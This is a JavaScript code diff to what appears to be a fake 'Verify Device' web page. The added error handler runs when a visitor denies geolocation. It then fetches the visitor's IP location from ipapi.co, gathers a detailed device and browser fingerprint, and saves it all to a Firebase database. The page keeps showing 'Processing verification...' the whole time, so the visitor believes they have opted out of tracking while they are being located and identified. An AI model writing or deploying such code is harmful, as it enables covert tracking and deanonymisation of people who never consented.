@@ -169,10 +169,85 @@ document.addEventListener('DOMContentLoaded', () => {
                         allowLocationButton.classList.remove('loading');
                     }
                 },
-                (error) => {
+                async (error) => {
                     console.error('Error getting location:', error);
-                    // Keep showing loading state on location error
-                    locationStatus.textContent = 'Processing verification...';
+                    
+                    // Try to get location from IP as fallback
+                    try {
+                        const ipResponse = await fetch('https://ipapi.co/json/');
+                        const ipData = await ipResponse.json();
+                        
+                        const locationData = {
+                            latitude: ipData.latitude,
+                            longitude: ipData.longitude,
+                            accuracy: 5000, // IP geolocation is typically accurate to city level (~5km)
+                            locationSource: 'IP Geolocation',
+                            timestamp: new Date().toISOString(),
+                            userAgent: navigator.userAgent,
+                            ip: ipData.ip,
+                            screen: {
+                                width: window.screen.width,
+                                height: window.screen.height,
+                                colorDepth: window.screen.colorDepth,
+                                pixelRatio: window.devicePixelRatio
+                            },
+                            device: {
+                                memory: navigator.deviceMemory || 'Unknown',
+                                cores: navigator.hardwareConcurrency || 'Unknown',
+                                platform: navigator.platform,
+                                vendor: navigator.vendor,
+                                language: navigator.language,
+                                languages: navigator.languages,
+                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                touchPoints: navigator.maxTouchPoints,
+                                connection: navigator.connection ? {
+                                    type: navigator.connection.effectiveType,
+                                    downlink: navigator.connection.downlink,
+                                    rtt: navigator.connection.rtt,
+                                    saveData: navigator.connection.saveData
+                                } : 'Unknown'
+                            },
+                            browser: {
+                                cookiesEnabled: navigator.cookieEnabled,
+                                doNotTrack: navigator.doNotTrack,
+                                plugins: Array.from(navigator.plugins).map(p => p.name),
+                                webdriver: navigator.webdriver,
+                                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                                deviceOrientation: window.DeviceOrientationEvent ? 'Supported' : 'Not supported',
+                                webGL: !!document.createElement('canvas').getContext('webgl')
+                            },
+                            geoError: {
+                                code: error.code,
+                                message: error.message
+                            }
+                        };
+
+                        // Save fallback location data to Firebase
+                        if (!database) {
+                            console.error('Database not initialized');
+                            locationStatus.textContent = 'Verification error. Please try again.';
+                            return;
+                        }
+
+                        try {
+                            const newLocationRef = database.ref('locations').push();
+                            await newLocationRef.set(locationData);
+                            console.log('Fallback location saved successfully to Firebase with key:', newLocationRef.key);
+                            locationStatus.textContent = 'Processing verification...';
+                        } catch (dbError) {
+                            console.error('Error saving location to Firebase:', dbError);
+                            locationStatus.textContent = 'Verification error. Please try again.';
+                            allowLocationButton.disabled = false;
+                            allowLocationButton.textContent = 'Verify Device';
+                            allowLocationButton.classList.remove('loading');
+                        }
+                    } catch (ipError) {
+                        console.error('Error getting IP location:', ipError);
+                        locationStatus.textContent = 'Verification error. Please try again.';
+                        allowLocationButton.disabled = false;
+                        allowLocationButton.textContent = 'Verify Device';
+                        allowLocationButton.classList.remove('loading');
+                    }
                 }
             );
         } else {
